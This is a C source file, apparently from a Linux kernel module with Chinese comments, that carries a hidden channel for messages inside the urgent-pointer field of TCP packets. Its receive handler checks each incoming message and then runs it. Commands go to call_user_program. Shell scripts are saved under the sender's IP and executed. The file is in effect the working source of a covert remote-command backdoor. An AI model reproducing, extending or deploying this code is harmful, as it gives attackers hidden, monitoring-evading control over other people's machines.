#include "handle.h"

// 数据发送处理函数
int send_data(unsigned int ip, unsigned short *buf, int size, unsigned int seq)
{
    int state;
    Data *pd = find_data(send_map, ip); // 从数据结构中检索与ip对应的数据
    if (!pd) return -1;

    if (seq == pd->lastseq) // 若因网络问题数据重发，保证tcp的seq相同时发送同样的数据
    {
        *buf = pd->lastsnd;
        return 0;
    }
    state = get_sstate(pd); // 获取数据发送的状态
    switch (state)
    {
        case _NULL: return 0;
        case _FINI:
            // 数据发送完成后一段时间若没有收到应答信息，则重发
            if (pd->cd == 0)
            {
                set_sstate(pd, _WAIT);
                pd->cont_pos = 0;
            }
            else
            {
                pd->cd--;
            }
            break;
        case _SEND: 
            // 数据正常发送状态
            get_content(pd, buf, size);
            if (pd->cont_pos == pd->size)
            {
                set_sstate(pd, _CHEK);
            }
            break;
        case _WAIT:
            // 数据开始发送
            switch (pd->type)
            {
                case TP_ACKN:
                case TP_RESD:
                    // 应答信息每隔一段时间发送一次，直到自身被删除
                    if (pd->cd == 0)
                    {
                        *buf = 0x0100 + pd->type;
                        set_cd(pd, DEFCD);
                        print_data(pd);
                    }
                    else
                    {
                        pd->cd--;
                    }
                    break;
                case TP_FINI:
                    // 应答信息的应答，即传输结束
                    *buf = 0x0100 + pd->type;
                    print_data(pd);
                    delete_data(send_map, ip);
                    break;
                default:
                    // 正常数据的发送请求
                    *buf = 0x0100 + pd->type;
                    print_data(pd);
                    set_sstate(pd, _WAIT2);
            }
            break;
        case _WAIT2:
            // 发送数据的大小
            *buf = 0x8000 + pd->size;
            set_sstate(pd, _SEND);
            break;
        case _CHEK:
            {
                // 传输内容结束后，发送数据的校验码
                unsigned short chksum = check_chk(pd);
                memcpy(buf, &chksum, sizeof(chksum));
                set_cd(pd, DEFCD);
                set_sstate(pd, _FINI);
                break;
            }
    }
    // 记录上次发送时的seq与数据
    pd->lastseq = seq;
    pd->lastsnd = *buf;
    /* printk(KERN_INFO "Seq: %u, *urg: %c%c\n", ntohl(tcph->seq), tcph->urg_ptr & 0xff, tcph->urg_ptr >> 8); */
    return 0;
}

// 数据接收处理函数
void recv_data(unsigned int ip, const unsigned short *buf, int size, unsigned int seq)
{
    int state;
    Data *pd;

    if (*buf >> 8 == 0x1) // 新的数据传输请求
    {
        switch (*buf & 0xff) // 检查数据请求类型
        {
        case TP_ACKN:
            // 接收数据请求为应答，表明数据发送成功，删除已经发送完成的数据
            pd = find_data(send_map, ip);
            /* if (pd) */
            if (pd && pd->s_state == _FINI)
            {
                delete_data(send_map, ip);
            }
            // 发送传输结束请求
            pd = insert_data(send_map, ip, 0);
            set_type(pd, TP_FINI);
            break;
        case TP_RESD:
            // 接收数据请求为重发, 重设已经发送的数据
            pd = find_data(send_map, ip);
            if (pd && pd->s_state == _FINI)
            {
                set_sstate(pd, _WAIT);
                pd->cont_pos = 0;
                printk(KERN_INFO "Resend.\n");
            }
            break;
        case TP_FINI:
            // 接收数据请求为结束，删除一直间隔发送的应答请求
            pd = find_data(send_map, ip);
            if (pd && pd->type == TP_ACKN)
            {
                delete_data(send_map, ip);
                printk(KERN_INFO "Finished.\n");
            }
            break;
        default:
            // 接收数据请求为新的数据内容，在数据结构中创建新的容器
            pd = find_data(recv_map, ip);
            if (pd)
            {
                delete_data(recv_map, ip);
            }
            pd = append_data(recv_map, ip, 0);
            pd->type = *buf & 0xff;

            pd = find_data(send_map, ip);
            if (pd && pd->type == TP_RESD)
            {
                delete_data(send_map, ip);
            }
            break;
        }
        return;
    }

    pd = find_data(recv_map, ip);
    if (!pd) return;

    // 重复收到因网络波动而重发的数据时，丢弃
    if (seq == pd->lastseq)
    {
        return;
    }
    pd->lastseq = seq;
    state = get_rstate(pd); // 获取数据接收的状态
    switch (state)
    {
        case _NULL: break;
        case _WAIT:
            // 接收数据的大小
            resize_data(pd, *buf & 0x7fff);
            printk("size = %d\n", *buf & 0x7fff);
            set_rstate(pd, _RECV);
            break;
        case _RECV:
            // 接收数据的内容
            add_content(pd, buf, size);
            if (pd->cont_pos == pd->size)
            {
                pd->content[pd->size] = '\0';
                set_rstate(pd, _CHEK);
            }
            break;
        case _CHEK:
            {
                // 接收数据的校验码
                unsigned short chksum;
                chksum = check_chk(pd); // 检查接收数据的校验码
                if (!memcmp(&chksum, buf, sizeof(chksum))) // 与接收的校验码对比
                {
                    printk(KERN_INFO "Recived data:\n");
                    print_data(pd);
                    /* info("Checksum correct!\n"); */
                    switch (pd->type)
                    {
                        case TP_ACKN: break; // 数据类型为应答信息
                        case TP_COMD: call_user_program(pd->content, ip); break; // 数据类型为命令
                        case TP_SHFL: // 数据类型为shell脚本
                        {
                            char fpath[40];
                            char ipstr[20];
                            ipnAddrToStr(ipstr, ip);
                            strcpy(fpath, SHFILEPATH);
                            strcat(fpath, ipstr);
                            save_to_file_q(fpath, pd);
                            call_user_file(fpath, ip); // 执行脚本
                            break;
                        }
                        case TP_DATA: save_to_file(SAVEFILE, pd); break; // 数据类型为单数据
                    }
                    
                    delete_data(recv_map, ip);

                    // 向对方发送应答信息
                    pd = append_data(send_map, ip, 0);
                    set_type(pd, TP_ACKN);
                    
                    break;
                }
                info("Checksum incorrect!\n");
                print_data(pd);
                delete_data(recv_map, ip);

                // 向对方发送重发信息
                pd = append_data(send_map, ip, 0);
                set_type(pd, TP_RESD);
                break;
            }
    }
}

